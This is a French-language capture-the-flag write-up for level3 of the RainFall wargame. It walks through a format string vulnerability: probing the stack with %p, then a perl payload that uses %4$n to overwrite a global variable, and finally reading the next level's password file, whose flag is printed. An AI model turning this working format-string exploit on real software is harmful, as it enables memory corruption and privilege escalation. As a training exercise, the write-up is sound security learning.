# level3

La faille semble être un **format string vulnerability**.

On a utilisé [cette source](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b), entre autres, pour plus d'information.

Comme l'input utilisateur n'est pas vérifié on peut utiliser les formateurs de la fonction printf pour parvenir à nos fins.

On remarque avec ce payload :
`AAAA %p %p %p %p %p %p %p %p`
Que notre contenu AAAA est affiché sur le 4e bloc de mémoire (0x41414141) :
`AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520`

On a la possibilité d'utiliser l'opérateur `n` qui permet normalement d'écrire le nombre de caractères écrits jusqu'à présent dans une variable en argument.

On peut spécifier sur quel argument écrire cette valeur avec un format de ce type : `%x$n` ou `x` représente la position de l'argument.

Dans notre cas, nous avons déjà l'adresse de la valeur à modifier : `0x804988c`.

L'idée serait donc de mettre cette adresse en premier lieu, pour pouvoir écrire sur cet emplacement:

```perl -e 'print "\x8c\x98\x04\x08"."%4\$n"' > /tmp/payload```



Ceci ne nous donne pas encore le résultat voulu car nous n'avons pas écrit la bonne valeur à l'adresse de la variable globale.

Il nous suffit donc de rajouter des caractères de façon à atteindre la valeur souhaité (64) :

```perl -e 'print "\x8c\x98\x04\x08"."A"x60 . "%4\$n"' > /tmp/payload```



En le lançant de manière à garder la main on peut enfin obtenir le bon flag !

```
level3@RainFall:~$ cat /tmp/payload - | ./level3 

�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
